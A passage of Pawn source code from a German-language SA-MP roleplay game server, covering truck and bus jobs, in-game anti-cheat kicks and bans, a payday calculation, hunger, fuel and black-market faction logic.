					    vehicleprodukte[veh] += PlayerProdukt[i];
					    PlayerProdukt[i] = 0;
						format(str,sizeof(str),"Produkte eingeladen. Es sind %d/100. Hol noch welche..",vehicleprodukte[veh]);
						SendClientMessage(i,COLOR_GREEN,str);
					    ClearAnimations(i);
					    SetPlayerSpecialAction(i,SPECIAL_ACTION_NONE);
					    ApplyAnimation(i, "RYDER", "VAN_THROW", 4.2, 0, 0, 0, 0, 0);
					    RemovePlayerAttachedObject(i, 9);
			    		if(vehicleprodukte[veh] == 100)
					    {
					    	SendClientMessage(i,COLOR_GREEN,"Gut! Dein Truck ist nun beladen. Du kannst nun zum ersten Laden fahren. ( Checkpoint )");
					    	SetPlayerCheckpoint(i,6419.5078,-9155.7246,4.2146-1,5);
					    	PlayerTruckmodus[i] = 3;
					    }
					}
					else if(RZ >= 225 && RZ <= 315 && IsPlayerInRangeOfPoint(i,3.0,X-5,Y,Z-0.6) && PlayerTruckmodus[i] == 2)
					{
					    vehicleprodukte[veh] += PlayerProdukt[i];
					    PlayerProdukt[i] = 0;
						format(str,sizeof(str),"Produkte eingeladen. Es sind %d/100. Hol noch welche..",vehicleprodukte[veh]);
						SendClientMessage(i,COLOR_GREEN,str);
					    ClearAnimations(i);
					    SetPlayerSpecialAction(i,SPECIAL_ACTION_NONE);
					    ApplyAnimation(i, "RYDER", "VAN_THROW", 4.2, 0, 0, 0, 0, 0);
					    RemovePlayerAttachedObject(i, 9);
			    		if(vehicleprodukte[veh] == 100)
					    {
					    	SendClientMessage(i,COLOR_GREEN,"Gut! Dein Truck ist nun beladen. Du kannst nun zum ersten Laden fahren. ( Checkpoint )");
					    	SetPlayerCheckpoint(i,6419.5078,-9155.7246,4.2146-1,5);
					    	PlayerTruckmodus[i] = 3;
					    }
					}
					else if((RZ >= 315 || RZ <= 45) && IsPlayerInRangeOfPoint(i,3.0,X,Y-5,Z-0.6) && PlayerTruckmodus[i] == 2)
					{
					    vehicleprodukte[veh] += PlayerProdukt[i];
					    PlayerProdukt[i] = 0;
						format(str,sizeof(str),"Produkte eingeladen. Es sind %d/100. Hol noch welche..",vehicleprodukte[veh]);
						SendClientMessage(i,COLOR_GREEN,str);
					    ClearAnimations(i);
					    SetPlayerSpecialAction(i,SPECIAL_ACTION_NONE);
					    ApplyAnimation(i, "RYDER", "VAN_THROW", 4.2, 0, 0, 0, 0, 0);
					    RemovePlayerAttachedObject(i, 9);
			    		if(vehicleprodukte[veh] == 100)
					    {
					    	SendClientMessage(i,COLOR_GREEN,"Gut! Dein Truck ist nun beladen. Du kannst nun zum ersten Laden fahren. ( Checkpoint )");
					    	SetPlayerCheckpoint(i,6419.5078,-9155.7246,4.2146-1,5);
					    	PlayerTruckmodus[i] = 3;
					    }
					}
			    }



				if(IsPlayerInRangeOfPoint(i,7.0,-2708.5581,1654.9690,10.9))
				{
				   	if(GetPlayerVehicleSeat(i) == 0)
				   	{
						if(Respray[i] == 0)
						{
						    Respray[i] = 1;
						    MoveDynamicObject(PNSEingang, -2708.5801, 1644.5001, 12.7400, 1, 0.00, 0.00, 90.00);
							ShowPlayerDialog(i,DIALOG_PNS,DIALOG_STYLE_LIST,"Was möchtest du machen?","Fahrzeugreperatur\nUmspritzung\nNitro\nHydraulik","Weiter","Verlassen");
						}
					}
				}
				else if(SpielerInfo[i][uJob] == 3 && Buslinie[i] != 0 && IsPlayerInRangeOfPoint(i,6,Buslinien[Buslinie[i]-1][0],Buslinien[Buslinie[i]-1][1],Buslinien[Buslinie[i]-1][2]))
				{
				    new str[120];
					if(Buslinie[i] < sizeof(Buslinien))
					{
					    if(GetVehicleModel(GetPlayerVehicleID(i))== 431)
					    {
							DisablePlayerCheckpoint(i);
			    			SetPlayerCheckpoint(i,Buslinien[Buslinie[i]][0],Buslinien[Buslinie[i]][1],Buslinien[Buslinie[i]][2],3.0);
							new Float:geld = 30+random(6);
							GebeGeld(i,geld);
							format(str,sizeof(str),"Bushaltestelle erreicht, du bekommst: %.2f$",geld);
							SendClientMessage(i,COLOR_GREEN,str);
			    			GameTextForPlayer(i,"Passagiere einsteigen lassen",3000,3);
			    			Freeze(i); SetTimerEx("Unfreeze",4000,0,"d",i);
						}else SendClientMessage(i,COLOR_RED,"Du sitzt nicht im Bus!");
	    			}
	    			else
	    			{
	    			    if(GetVehicleModel(GetPlayerVehicleID(i))== 431)
					    {
		    			    DisablePlayerCheckpoint(i);
		    			    Buslinie[i] = 0;
		    			    SendClientMessage(i,COLOR_GREEN,"Du hast 350$ bekommen, da die Busstrecke nun zu Ende ist.");
		    			    GebeGeld(i,350);
		    			    SetTimerEx("Busfahrerreset",2000,0,"d",i);
                        }else SendClientMessage(i,COLOR_RED,"Du sitzt nicht im Bus!");
	    			}
	    			Buslinie[i]++;
	    		}
				if(GetPlayerSpecialAction(i) == SPECIAL_ACTION_USEJETPACK && SpielerInfo[i][uAdmin] < 1)
				{
				    format(string,sizeof string,"County Islands: %s wurde gebannt, Grund: Jetpack Hack",PlayerName(i));
					SendMessageToAll(COLOR_LIGHTRED,string);
				    KWBLog(PlayerName(i),"System","Bann","Jetpack Hack");
				    BanEx(i,"Jetpack Hack");
				    panelfiles(i, -1, 2,"Jetpack Hack");
				}
				format(string,sizeof string,"%02d.%02d.%d",Day, Month, Year);
				TextDrawSetString(UserBr[7],string);

				format(string,sizeof string,"%02d:%02d:%02d UHR",Hour, Minute, Second);
				TextDrawSetString(UserBr[8],string);
				for(new x = 1; x < 13; x++)
				{
					GetPlayerWeaponData(i, x, twaffe, tmuni);
		   			if(tmuni > SpielerWaffen[i][x][sMuni] && twaffe != 46 && twaffe != 40 && tmuni > 0)
		   			{
		   			    format(string,sizeof string,"%s steht unter Munihackverdacht, Waffe: %d - Muni: %d",PlayerName(i),twaffe,tmuni);
		   			    if(AntiCheat[i][cAnti] == 0)
						{
					 		if(AdminsConnected() == 0)
					 		{
					 		    SendClientMessage(i,COLOR_LIGHTRED,"Du wurdest gekickt, Grund: Munitons Hack!");
					 		    format(string,sizeof string,"County Islands: %s wurde gekickt, Grund: Munitions Hack",PlayerName(i));
								SendMessageToAll(COLOR_LIGHTRED,string);
				    			KWBLog(PlayerName(i),"System","Kick","Munitions Hack");
				    			
					 		}
					 		else SendAdminMessage(COLOR_LIGHTRED,string,1);
			 			}
		   			    SpielerWaffen[i][x][sMuni] = tmuni;
		   			    break;
		   			}
		   			if(twaffe != SpielerWaffen[i][x][sWaffe] && twaffe != 0 && twaffe != 46 && tmuni > 1 && twaffe != 40)
		   			{
		   				format(string,sizeof string,"%s steht unter Waffenhackverdacht, Waffe: %d - Muni: %d",PlayerName(i),twaffe,tmuni);
		   			    if(AntiCheat[i][cAnti] == 0)
						{
		   			    	if(AdminsConnected() == 0)
					 		{
					 		    SendClientMessage(i,COLOR_LIGHTRED,"Du wurdest gekickt, Grund: Waffen Hack!");
					 		    format(string,sizeof string,"County Islands: %s wurde gekickt, Grund: Waffen Hack",PlayerName(i));
								SendMessageToAll(COLOR_LIGHTRED,string);
				    			KWBLog(PlayerName(i),"System","Kick","Waffen Hack");
				    			Kick(i);
					 		}
					 		else SendAdminMessage(COLOR_LIGHTRED,string,1);
						}
		   			    SpielerWaffen[i][x][sWaffe] = twaffe;
		   			    break;
		   			}
				}
    			GetPlayerHealth(i,health);
       			GetPlayerArmour(i,ruestung);
				if((health > AntiCheat[i][cLeben]) && SpielerInfo[i][uTod] == 0)
				{
				    format(string,sizeof string,"%s steht unter Lebenshackverdacht, Leben: %.2f",PlayerName(i),health);
	 		    	if(AntiCheat[i][cAnti] == 0)
			 		{
		 				if(AdminsConnected() == 0)
					 	{
					 	    SendClientMessage(i,COLOR_LIGHTRED,"Du wurdest gekickt, Grund: Lebens Hack!");
					 	    format(string,sizeof string,"County Islands: %s wurde gekickt, Grund: Lebens Hack",PlayerName(i));
							SendMessageToAll(COLOR_LIGHTRED,string);
				    		KWBLog(PlayerName(i),"System","Kick","Lebens Hack");
				    		Kick(i);
				 		}
					  	else SendAdminMessage(COLOR_LIGHTRED,string,1);
				  	}
	 		    	AntiCheat[i][cLeben] = health;
	 		    	if(health > 99.8) AntiCheat[i][cLeben] = 99.8;
				}
				if(ruestung > AntiCheat[i][cRuestung] || ruestung > 99.8)
				{
				    format(string,sizeof string,"%s steht unter Rüstungshackverdacht, Rüstung: %.2f",PlayerName(i),ruestung);
	 		    	if(AntiCheat[i][cAnti] == 0)
			 		{
			 			if(AdminsConnected() == 0)
					 	{
					 	    SendClientMessage(i,COLOR_LIGHTRED,"Du wurdest gekickt, Grund: Rüstungs Hack!");
					 	    format(string,sizeof string,"County Islands: %s wurde gekickt, Grund: Rüstungs Hack",PlayerName(i));
							SendMessageToAll(COLOR_LIGHTRED,string);
				    		KWBLog(PlayerName(i),"System","Kick","Rüstungs Hack");
				    		Kick(i);
				 		}
					 	else SendAdminMessage(COLOR_LIGHTRED,string,1);
				 	}
	 		    	AntiCheat[i][cRuestung] = ruestung;
	 		    	if(ruestung > 99.8) AntiCheat[i][cRuestung] = 99.8;
				}
				if(IsPlayerInAnyVehicle(i) && GetVehicleDriver(GetPlayerVehicleID(i)) == i)
				{
				    if(GetPlayerSpeed(i) > VehicleMaxSpeed[GetVehicleModel(GetPlayerVehicleID(i))-400][vspeed]+20)
				    {
				        if(AdminsConnected() == 0)
					 	{
					 	    SendClientMessage(i,COLOR_LIGHTRED,"Du wurdest gekickt, Grund: Speed Hack!");
					 	    format(string,sizeof string,"County Islands: %s wurde gekickt, Grund: Speed Hack",PlayerName(i));
							SendMessageToAll(COLOR_LIGHTRED,string);
				    		KWBLog(PlayerName(i),"System","Kick","Speed Hack");
				    		Kick(i);
				 		}
				 		else
				 		{
					        format(string,sizeof string,"%s steht unter Speedhackverdacht.",PlayerName(i));
	    					SendAdminMessage(COLOR_LIGHTRED,string,1);
    					}
				    }
				    /*else if(!IstEinFlugzeug(GetPlayerVehicleID(i)) && !IstEinHeli(GetPlayerVehicleID(i)))
					{
					    new Float:X,Float:Y,Float:Z;
     					GetVehiclePos(GetPlayerVehicleID(i),X,Y,Z);
						if(Z > 43)
						{
						    if(AdminsConnected() == 0)
						 	{
						 	    SendClientMessage(i,COLOR_LIGHTRED,"Du wurdest gekickt, Grund: Fly Hack!");
						 	    format(string,sizeof string,"County Islands: %s wurde gekickt, Grund: Fly Hack",PlayerName(i));
								SendMessageToAll(COLOR_LIGHTRED,string);
					    		KWBLog(PlayerName(i),"System","Kick","Fly Hack");
					    		Kick(i);
					 		}
					 		else
					 		{
							    format(string,sizeof string,"%s steht unter Vehicleflyverdacht.",PlayerName(i));
	   							SendAdminMessage(COLOR_LIGHTRED,string,1);
   							}
						}
					}*/
				}
				else if(!IsPlayerInAnyVehicle(i))
				{
				    new Float:X,Float:Y,Float:Z;
     				GetPlayerPos(i,X,Y,Z);
				    if(AntiCheat[i][cAnti] == 0)
				    {
				        new anim = GetPlayerAnimationIndex(i);
				        if(Z > 12 && (anim == 1543 || anim == 1538 || anim == 1539))
				        {
				            if(AdminsConnected() == 0)
						 	{
						 	    SendClientMessage(i,COLOR_LIGHTRED,"Du wurdest gekickt, Grund: Fly Hack!");
						 	    format(string,sizeof string,"County Islands: %s wurde gekickt, Grund: Fly Hack",PlayerName(i));
								SendMessageToAll(COLOR_LIGHTRED,string);
					    		KWBLog(PlayerName(i),"System","Kick","Fly Hack");
					    		Kick(i);
					 		}
					 		else
					 		{
	                        	format(string,sizeof string,"%s steht unter Flyhackverdacht.",PlayerName(i));
	 							SendAdminMessage(COLOR_LIGHTRED,string,1);
 							}
				        }
				        else if(!IsPlayerInRangeOfPoint (i, 50.0, AntiCheat[i][cPosX], AntiCheat[i][cPosY], AntiCheat[i][cPosZ]) && Z > AntiCheat[i][cPosZ]-10 && GetPlayerSurfingVehicleID(i) == INVALID_VEHICLE_ID && Spectate[i] == -1 && GetPlayerSpecialAction(i) != SPECIAL_ACTION_USEJETPACK && imtut[i] == 0)
				        {
				            AntiCheat[i][cTeleportWarns]++;
				            if(AntiCheat[i][cTeleportWarns] > 10)
				            {
					            if(AdminsConnected() == 0)
							 	{
							 	    SendClientMessage(i,COLOR_LIGHTRED,"Du wurdest gekickt, Grund: Teleport Hack!");
							 	    format(string,sizeof string,"County Islands: %s wurde gekickt, Grund: Teleport Hack",PlayerName(i));
									SendMessageToAll(COLOR_LIGHTRED,string);
						    		KWBLog(PlayerName(i),"System","Kick","Teleport Hack");
						    		Kick(i);
						 		}
						 		else
						 		{
					                format(string,sizeof string,"%s steht unter Teleporthackverdacht.",PlayerName(i));
	    							SendAdminMessage(COLOR_LIGHTRED,string,1);
	    							AntiCheat[i][cTeleportWarns] = 0;
  								}
				            }
			    			AntiCheat[i][cPosX] = X;
							AntiCheat[i][cPosY] = Y;
							AntiCheat[i][cPosZ] = Z;
				        }
						else
					    {
					        AntiCheat[i][cPosX] = X;
							AntiCheat[i][cPosY] = Y;
							AntiCheat[i][cPosZ] = Z;
					    }
				   	}
				   	else
				    {
				        AntiCheat[i][cPosX] = X;
						AntiCheat[i][cPosY] = Y;
						AntiCheat[i][cPosZ] = Z;
				    }
				}
				if(GetPlayerMoney(i) > 0)
				{
		            if(AdminsConnected() == 0)
				 	{
				 	    SendClientMessage(i,COLOR_LIGHTRED,"Du wurdest gebannt, Grund: Geld Hack!");
				 	    format(string,sizeof string,"County Islands: %s wurde gebannt, Grund: Geld Hack",PlayerName(i));
						SendMessageToAll(COLOR_LIGHTRED,string);
			    		KWBLog(PlayerName(i),"System","Bann","Geld Hack");
			    		Ban(i);
			    		SpielerInfo[i][uBan] = 1;
			    		panelfiles(i, -1, 2,"Geld Hack");
			 		}
			 		else
			 		{
		                format(string,sizeof string,"%s steht unter Geldhackverdacht.",PlayerName(i));
						SendAdminMessage(COLOR_LIGHTRED,string,1);
					}
				}
				if(IsPlayerInAnyVehicle(i))
				{
					GetVehicleHealth(GetPlayerVehicleID(i),health);
					if((GetVehicleModel(GetPlayerVehicleID(i)) == 532 || GetVehicleModel(GetPlayerVehicleID(i)) == 539) && health < 1000) SetVehicleHealth(GetPlayerVehicleID(i),1000);
				}
				if(AntiCheat[i][cAnti] > 0) AntiCheat[i][cAnti]--;
				if(AntiCheat[i][cSprung] > 0) AntiCheat[i][cSprung]--;
				}
				else if(gettime()-SpielerInfo[i][uDesktop] == 60)
				{
				    SpielerInfo[i][uAFK] = 300;
				}
				if(SpielerInfo[i][uAFK] == 290)
				{
				     GameTextForPlayer(i,"Du wirst in 10 Sekunden in den AFK Modus versetzt! Nutze /zuruck.",3000,3);
				}
				else if(SpielerInfo[i][uAFK] == 299)
				{
				    format(string,sizeof string,"%s ist jetzt AFK",PlayerName(i));
				    SendMessageToAll(COLOR_BLUE,string);
				}
				else if(SpielerInfo[i][uAFK] == 300)
				{
				    GameTextForPlayer(i,"Du bist AFK! Nutze /back wenn du wieder da bist.",1000,3);
				    Freeze(i);
				}
				if(SpawnSchutz[i] > 0) SpawnSchutz[i]--;
			    if(SpielerInfo[i][uKnastZeit] > 1)
			    {
			        SpielerInfo[i][uKnastZeit]--;
			    }
			    else if(SpielerInfo[i][uKnastZeit] == 1)
			    {
			        if(SpielerInfo[i][uGefangen] == 1)
			        {
	           			SpielerInfo[i][uKnastZeit] = 0;
						Teleport(i,1565.5222,-9526.9697,6.9017);
						SetPlayerFacingAngle(i, 185.8319);
						SpielerInfo[i][uGefangen] = 0;
					}
					else if(SpielerInfo[i][uGefangen] == 2)
			        {
	           			SpielerInfo[i][uKnastZeit] = 0;
						Teleport(i,6487.7231,-7870.0166,4.6186);
						SetPlayerFacingAngle(i, 4.0967);
						SpielerInfo[i][uGefangen] = 0;
					}
					else if(SpielerInfo[i][uGefangen] == 3)
			        {
	           			SpielerInfo[i][uKnastZeit] = 0;
						Teleport(i,4341.2251,-8540.0332,4.4163);
						SetPlayerFacingAngle(i, 93.1312);
						SpielerInfo[i][uGefangen] = 0;
					}
			    }
    			new newkeys,ud,lr;
				GetPlayerKeys(i,newkeys,ud,lr);
	 			if(HOLDING(KEY_FIRE) && (GetVehicleModel(GetPlayerVehicleID(i)) == 407 || GetVehicleModel(GetPlayerVehicleID(i)) == 601 || GetPlayerWeapon(i) == 42))
	 			{
	 			    new Float:X,Float:Y,Float:Z;
					for(new x = 0; x < sizeof(FeuerPos); x++)
					{
		    			for(new y = 0; y < sizeof(FeuerPos[]); y++)
		    			{
		    			    GetDynamicObjectPos(HausFeuer[x][y],X,Y,Z);
							if(IsPlayerAimingAt(i,X,Y,Z-1,4.0))
							{
								FeuerLoeschen[x][y]++;
						    	if(FeuerLoeschen[x][y] == 11)
						    	{
						    	    DestroyDynamicObject(HausFeuer[x][y]);
						    	    FeuerLoeschen[x][y] = 0;
						    	    HausFeuerAus(x);
								}
								goto aloop;
		    				}
						}
					}
					aloop:
	  			}
	  			if(SpielerInfo[i][uAFK] != 300)
	  			{
				    SpielerInfo[i][uPayDaySekunden]++;
				    if(SpielerInfo[i][uPayDaySekunden] >= 3600) //Eine Stunde
				    {
				        new DGehalt[8] = {
						1000,
						1200,
						1500,
						1650,
						1700,
						2000,
						2600,
						3000
						};
						new mainstring[512],Float:Gehalt,Float:alt = SpielerInfo[i][uKonto];
						format(mainstring,sizeof mainstring,"Alter Kontostand: %.2f$\n_______________________________\nEinnahmen\n------------------\n{00FF00}",SpielerInfo[i][uKonto]);
						if(SpielerInfo[i][uRang] < 1) SpielerInfo[i][uRang] = 1;
						Gehalt = DGehalt[SpielerInfo[i][uRang]-1];
				        if(SpielerInfo[i][uArbeitslosengeld] == 0) format(string,sizeof string,"Gehalt(brutto): %.2f$",Gehalt);
				        else
						{
						    Gehalt = 900.0;
							format(string,sizeof string,"Arbeitslosengeld: %.2f",Gehalt);
						}
				        format(string,sizeof string,"%s\nZinsen: %.2f$",string,SpielerInfo[i][uKonto]*0.005);
				        //Zinsen
				        SpielerInfo[i][uKonto] += Gehalt;
				        SpielerInfo[i][uKonto] += (Gehalt+SpielerInfo[i][uKonto])*0.005;
				        //Steuern
				        SpielerInfo[i][uKonto] -= Gehalt*Steuern;
				        //Krankenkasse
				        SpielerInfo[i][uKonto] -= Gehalt*0.06;
				        //Sonstiges
				        SpielerInfo[i][uKonto] -= Gehalt*0.03;


						new fahrzeugsteuern[150],kredit[20],kreditsumme[20],hotelkosten[25];
						format(fahrzeugsteuern,sizeof fahrzeugsteuern,"{FFFFFF}--Fahrzeug-Steuern--{FF0000}");
						for(new x = 0; x < 2; x++)
				        {
				            if(SAuto[i][x][sID] != -1)
				            {
				            	format(fahrzeugsteuern,sizeof fahrzeugsteuern,"%s\n%s: %.2f$",fahrzeugsteuern,AutoDaten[SAuto[i][x][sModel]-399][AutoName],SAuto[i][x][sPreis]/80);
								SpielerInfo[i][uKonto] -= SAuto[i][x][sPreis]/80;
							}
						}
						SpielerInfo[i][uLevel] += 1;
						SetPlayerScore(i,SpielerInfo[i][uLevel]);
						format(kredit,sizeof kredit,"");
						if(Kreditrate[i] != 0 && SpielerInfo[i][uKredit] == 100)
						{
							SpielerInfo[i][uKredit] = Kreditrate[i];
						    SendClientMessage(i,COLOR_GREEN,"Dein Kredit ist freigeschaltet!");
						    SpielerInfo[i][uKonto] += Kreditsumme[i];
						    format(kreditsumme,sizeof kreditsumme,"\nKredit: %.2f$",Kreditsumme[i]);
						}
						else if(SpielerInfo[i][uKredit] > 0)
						{
						    SpielerInfo[i][uKredit]--;
						    format(kredit,sizeof kredit,"Kredit: -%.2f$\n",Kreditsumme[i]/Kreditrate[i]);
						    SpielerInfo[i][uKonto]-=Kreditsumme[i]/Kreditrate[i];
						}
						if(SpielerInfo[i][uHausschluessel] != -1 && HausInfo[SpielerInfo[i][uHausschluessel]][hHotel] != 0)
						{
							format(hotelkosten,sizeof hotelkosten,"\nHotelkosten: 350$");
							SpielerInfo[i][uKonto] -= 350.0;
						}
						if(SpielerInfo[i][uHausschluessel] != -1 && HausInfo[SpielerInfo[i][uHausschluessel]][hBesitzer] != SpielerInfo[i][uID])
						{
						    format(hotelkosten,sizeof hotelkosten,"\nMiete: %.2f$",HausInfo[SpielerInfo[i][uHausschluessel]][hMiete]);
							SpielerInfo[i][uKonto] -= HausInfo[SpielerInfo[i][uHausschluessel]][hMiete];
						}
				        format(mainstring,sizeof mainstring,"{FFFFFF}%s%s%s\n{FFFFFF}Ausgaben\n------------------\n{FF0000}%sSteuern: -%.2f$\nKrankenversicherung: -%.2f$\nSonstige Sozialabgaben: -%.2f\n%s%s{FFFFFF}\n_______________________________\nNeuer Kontostand: %.2f$",mainstring,string,kreditsumme,kredit,Gehalt*Steuern,Gehalt*0.06,Gehalt*0.03,fahrzeugsteuern,hotelkosten,SpielerInfo[i][uKonto]);
	                    SpielerInfo[i][uPayDaySekunden] = 0;
						ShowPlayerDialog(i,DIALOG_MSGBOX,DIALOG_STYLE_MSGBOX,"Payday",mainstring,"Fertig","");
						if(alt-SpielerInfo[i][uKonto] >= 0) format(string,sizeof string,"INSERT INTO `kontolog` SET ID='%d',Betrag='%.2f',Zweck='%s',Zeit='%d'",SpielerInfo[i][uID],alt-SpielerInfo[i][uKonto],"Zahltag",gettime());
						else format(string,sizeof string,"INSERT INTO `kontolog` SET ID='%d',Betrag='%.2f',Zweck='%s',Zeit='%d'",SpielerInfo[i][uID],SpielerInfo[i][uKonto]-alt,"Zahltag",gettime());
						mysql_query(dbhandle, string);
						printf("%s",string);
				    }
		    	}
			    if(SpielerInfo[i][uHunger] > 100)
				{
                    SpielerInfo[i][uHunger] = 100;
				}
				if(Video[i] != 1 && ci_map_state[i] == false)
				{
					PlayerTextDrawHide(i,Hungeranzeige[i]);
					PlayerTextDrawDestroy(i,Hungeranzeige[i]);
					Hungeranzeige[i] = CreatePlayerTextDraw(i,607.00-((100-SpielerInfo[i][uHunger])/1.754), 59.000000, "_");
					PlayerTextDrawBackgroundColor(i,Hungeranzeige[i], 255);
					PlayerTextDrawFont(i,Hungeranzeige[i], 1);
					PlayerTextDrawLetterSize(i,Hungeranzeige[i], 0.549998, 0.099999);
					PlayerTextDrawColor(i,Hungeranzeige[i], -65281);
					PlayerTextDrawSetOutline(i,Hungeranzeige[i], 0);
					PlayerTextDrawSetProportional(i,Hungeranzeige[i], 1);
					PlayerTextDrawSetShadow(i,Hungeranzeige[i], 1);
					PlayerTextDrawUseBox(i,Hungeranzeige[i], 1);
					PlayerTextDrawBoxColor(i,Hungeranzeige[i], -65281);
					PlayerTextDrawTextSize(i,Hungeranzeige[i], 546.000000, 5.000000);
					PlayerTextDrawShow(i, Hungeranzeige[i]);
				}
				Hungervalue[i]++;
				if(Hungervalue[i] >= 90 && SpielerInfo[i][uHunger] > 5 && SpielerInfo[i][uAFK] < 300 && SpielerInfo[i][uTod] == 0) //Ändern
				{
				    Hungervalue[i] = 0;
				    SpielerInfo[i][uHunger]--;
				}
				/*else if(SpielerInfo[i][uHunger] == 5 && SpielerInfo[i][uAFK] < 300 && SpielerInfo[i][uTod] == 0)
				{
				    if(Hungervalue[i] >= 30)
				    {
				        GetPlayerHealth(i,health);
						GebeLeben(i,health-10);
						Hungervalue[i] = 0;
				    }
				}*/
				if(SpielerInfo[i][uVerstrahlt] == 1)
				{
				    Verstrahlen[i] ++;
				    if(Verstrahlen[i] >= 100)
				    {
				        GetPlayerHealth(i,health);
						GebeLeben(i,health-15);
						Verstrahlen[i] = 0;
				    }
				}
				if(PlayerCuffed[i] == 1)
				{
					TogglePlayerControllable(i,true);
    				PlayerCuffed[i] = 0;
    			}
  			 	else if(PlayerCuffed[i] > 1)
    			{
   					PlayerCuffed[i] -= 1;
	    		}
				if(HatTaser[i] == 1)
			    {
				    if(GetPlayerWeapon(i) == 0)
					{
						SetPlayerAttachedObject(i, 0, 18642, 6, 0.06, 0.01, 0.08, 180.0, 0.0, 0.0);
					}
					else
					{
						RemovePlayerAttachedObject(i, 0);
					}
				}
			}
 		}
	}
	new Float:RX2,Float:RY2,Float:RZ2, bool:PlayerInArea;
	for(new i = 0; i < MAX_PLAYERS; i++){
			if(IsPlayerInDynamicArea(i,bankzone)){
				PlayerInArea = true;
				break;
			}
	}
	GetDynamicObjectRot(Banktuerx[0],RX2,RY2,RZ2);
	if(PlayerInArea) {
		if(RZ2 == 0) {
		    MoveObjektRot(Banktuerx[0],RX2,RY2,-90,9);
		    GetDynamicObjectRot(Banktuerx[1],RX2,RY2,RZ2);
		    MoveObjektRot(Banktuerx[1],RX2,RY2,-90,9);
		}
	}
	else {
		if(RZ2 == -90.0) {
		    MoveObjektRot(Banktuerx[0],RX2,RY2,0,9);
		    GetDynamicObjectRot(Banktuerx[1],RX2,RY2,RZ2);
		    MoveObjektRot(Banktuerx[1],RX2,RY2,0,9);
		}
	}
	for(new x = 0; x < sizeof(FeuerPos); x++)
	{
 		if(HausBrenndauer[x] > -1)
   		{
			HausBrenndauer[x]++;
		}
		if(HausBrenndauer[x] >= 1800)
		{
  			for(new y = 0; y < sizeof(FeuerPos[]); y++)
  			{
  		 		DestroyDynamicObject(HausFeuer[x][y]);
  		 		goto afterbrand;
  			}
		}
	}
	afterbrand:
	for(new v = 0; v < MAX_VEHICLES; v++)
 	{
		if(IsValidVehicle(v))
		{
  			new distance;
	    	distance = GetDistanceToLastPoint(v);
			Meter[v] += distance;
 			Meter2[v] += distance;
	 		for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && !IsPlayerNPC(i) && IsPlayerInVehicle(i,v))
		 	{
	 			format(string, sizeof string, "Kilometer: %0d", Meter[v]/250);
		 		PlayerTextDrawSetString(i,TachoText[i][7],string);
    			format(string, sizeof string, "Tageskilometer: %0d", Meter2[v]/250);
       			PlayerTextDrawSetString(i,TachoText[i][6],string);
       		}
	        SaveCoords(v);
		 	new engine,lights,alarm,doors,bonnet,boot,objective;
			GetVehicleParamsEx(v,engine,lights,alarm,doors,bonnet,boot,objective);
		 	if(!IstEinKeinFuehrerscheinFahrzeug(v) && engine == VEHICLE_PARAMS_ON && Motorschaden[v] == 0)
		 	{
		 	    BenzinVerbrauch[v] += (float(distance)/250)*(float(AutoDaten[GetVehicleModel(v)-399][aVerbrauch])/50);// /100
	        	Benzin[v] -= floatround(BenzinVerbrauch[v],floatround_floor);
				if(floatround(BenzinVerbrauch[v],floatround_floor) >= 1) BenzinVerbrauch[v] = 0;
				for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && !IsPlayerNPC(i) && IsPlayerInVehicle(i,v))
				{
					if(Benzin[v] < 1)
					{
						Benzin[v] = 0;
						GameTextForPlayer(i,"~n~~n~~n~~n~~n~~n~~r~Tank leer",1500,3);
						SetVehicleParamsEx(v,VEHICLE_PARAMS_OFF,lights,alarm,doors,bonnet,boot,objective);
						PlayerTextDrawSetString(i, TachoText[i][8], "Motor: ~r~aus");
					}
					format(string, sizeof(string), "%d/%dL",Benzin[v],AutoDaten[GetVehicleModel(v)-399][MaxBenzin]);
					PlayerTextDrawSetString(i,TachoText[i][14],string);
				}
			}
 		}
	}
	for(new x = 0; x < sizeof(Mueltonnen); x++)
	{
        if(MueltonneGeleert[x] > 0)
        {
            MueltonneGeleert[x]--;
        }
	}
	for(new o = 0; o < sizeof(Bankfach); o++)
	{
		if(Bankfach[o][1] > 0) Bankfach[o][1]--;
	}
	for(new x = 0; x < sizeof(Schwarzmarkt); x++)
	{
		if(Schwarzmarkt[x][sEinnahmeZeit] > 0) Schwarzmarkt[x][sEinnahmeZeit]--;
		if(Schwarzmarkt[x][sEinnahmeZeit] == 1800)
		{
		    if(Schwarzmarkt[x][sAngreiferKills] == 0 && Schwarzmarkt[x][sBesitzerKills] == 0)
		    {
		        if(FraktionsUserOnline(Schwarzmarkt[x][sBesitzer]) > 0)
		        {
			        format(string,sizeof string,"Schwarzmarkt verloren. %d - %d Kills",Schwarzmarkt[x][sAngreiferKills],Schwarzmarkt[x][sBesitzerKills]);
			        FraktionsNachricht(Schwarzmarkt[x][sBesitzer],COLOR_LIGHTBLUE,string);
			        format(string,sizeof string,"Schwarzmarkt erfolgreich eingenommen. %d - %d Kills",Schwarzmarkt[x][sAngreiferKills],Schwarzmarkt[x][sBesitzerKills]);
					FraktionsNachricht(Schwarzmarkt[x][sAngreifer],COLOR_LIGHTBLUE,string);
					new besitzer = Schwarzmarkt[x][sBesitzer];
			        Schwarzmarkt[x][sBesitzer] = Schwarzmarkt[x][sAngreifer];
			        Schwarzmarkt[x][sAngreifer] = besitzer;
			        Schwarzmarkt[x][sAngreiferKills] = 0;
			        Schwarzmarkt[x][sBesitzerKills] = 0;
			        Fraktionskasse[besitzer]+=2500.0;
			        Frakkassespeichern(besitzer);
			        new string2[3];
			        format(string,sizeof string,"ID='%d'",x);
			        format(string2,sizeof string2,"%d",Schwarzmarkt[x][sBesitzer]);
			        mysqlupdate("schwarzmarkt",string,"Besitzer",string2);
		        }
		    }
		    if(Schwarzmarkt[x][sAngreiferKills] > Schwarzmarkt[x][sBesitzerKills])
		    {
		        format(string,sizeof string,"Schwarzmarkt verloren. %d - %d Kills",Schwarzmarkt[x][sAngreiferKills],Schwarzmarkt[x][sBesitzerKills]);
		        FraktionsNachricht(Schwarzmarkt[x][sBesitzer],COLOR_LIGHTBLUE,string);
		        format(string,sizeof string,"Schwarzmarkt erfolgreich eingenommen. %d - %d Kills",Schwarzmarkt[x][sAngreiferKills],Schwarzmarkt[x][sBesitzerKills]);
				FraktionsNachricht(Schwarzmarkt[x][sAngreifer],COLOR_LIGHTBLUE,string);
				new besitzer = Schwarzmarkt[x][sBesitzer];
		        Schwarzmarkt[x][sBesitzer] = Schwarzmarkt[x][sAngreifer];
		        Schwarzmarkt[x][sAngreifer] = besitzer;
		        Schwarzmarkt[x][sAngreiferKills] = 0;
